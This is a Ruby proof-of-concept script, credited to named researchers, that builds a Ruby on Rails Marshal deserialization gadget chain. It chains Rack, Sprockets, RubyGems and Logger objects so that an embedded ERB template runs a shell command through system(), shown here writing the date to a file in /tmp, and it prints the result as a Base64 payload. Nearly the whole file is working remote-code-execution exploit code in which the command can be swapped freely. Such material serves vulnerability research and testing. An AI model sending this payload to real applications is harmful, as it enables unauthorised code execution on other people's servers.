# original code by Harsh Jaiswal, AKA rootxharsh and Rahul Maini, AKA iamnoooob
# Mostly based on:
# https://github.com/httpvoid/writeups/blob/main/Ruby-deserialization-gadget-on-rails.md

require 'rails/all'
require 'base64'
# following three lines added for older versions of Ruby on Rails:
require 'rack/response'
require 'active_record/associations'
require 'active_record/associations/association'

require "yaml"
Gem::SpecFetcher
Gem::Installer

require 'sprockets'
class Gem::Package::TarReader
end

require 'bundler/inline'

gemfile do
  source 'https://rubygems.org'
  gem 'oj', require: true
end


d = Rack::Response.allocate
d.instance_variable_set(:@buffered, false)

d0=Rails::Initializable::Initializer.allocate
d0.instance_variable_set(:@context,Sprockets::Context.allocate)

d1=Gem::Security::Policy.allocate
# Can't use angle brackets in the command below or it will result in a dump format error(0xc3) ArgumentException
# Similar problem for + signs in some Ruby versions
# So the code below dynamically builds the string 'date >> /tmp/rce9a.txt'
d1.instance_variable_set(:@name,{ :filename => "/tmp/xyz.txt", :environment => d0  , :data => "<%= os_command = 'date '; os_command.concat(62.chr); os_command.concat(62.chr); os_command.concat('/tmp/rce9a.txt'); system(os_command); %>", :metadata => {}})

d2=Set.new([d1])

d.instance_variable_set(:@body, d2)
d.instance_variable_set(:@writer, Sprockets::ERBProcessor.allocate)

c=Logger.allocate
c.instance_variable_set(:@logdev, d)

e=Gem::Package::TarReader::Entry.allocate
e.instance_variable_set(:@read,2)
e.instance_variable_set(:@header,"bbbb")

b=Net::BufferedIO.allocate
b.instance_variable_set(:@io,e)
b.instance_variable_set(:@debug_output,c)

$a=Gem::Package::TarReader.allocate
$a.instance_variable_set(:@init_pos,Gem::SpecFetcher.allocate)
$a.instance_variable_set(:@io,b)

module ActiveRecord
    module Associations
        class Association
            def marshal_dump
                # Gem::Installer instance is also set here
                # because it autoloads Gem::Package which is
                # required in rest of the chain
                [Gem::Installer.allocate, $a]
            end
        end
    end
end

# binary form
final = ActiveRecord::Associations::Association.allocate
puts Base64.strict_encode64(Marshal.dump(final))